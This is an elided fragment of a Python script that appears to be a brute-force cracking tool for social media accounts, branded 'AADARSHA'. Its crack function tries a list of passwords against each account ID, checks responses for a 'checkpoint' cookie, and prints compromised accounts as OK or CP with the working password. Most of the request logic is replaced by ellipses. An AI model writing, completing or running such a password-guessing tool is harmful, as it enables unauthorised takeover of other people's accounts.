...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAADARSHA')
...
def login_lagi334():
	try:
		...
		print(f'  {u}[{h}AADARSHA{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}[AADARSHA]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}]×[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}[AADARSHA-CP] {idf}  {pw} {N}')     
				...
				print(f'\r{H}[AADARSHA-OK] {idf}  {pw}')
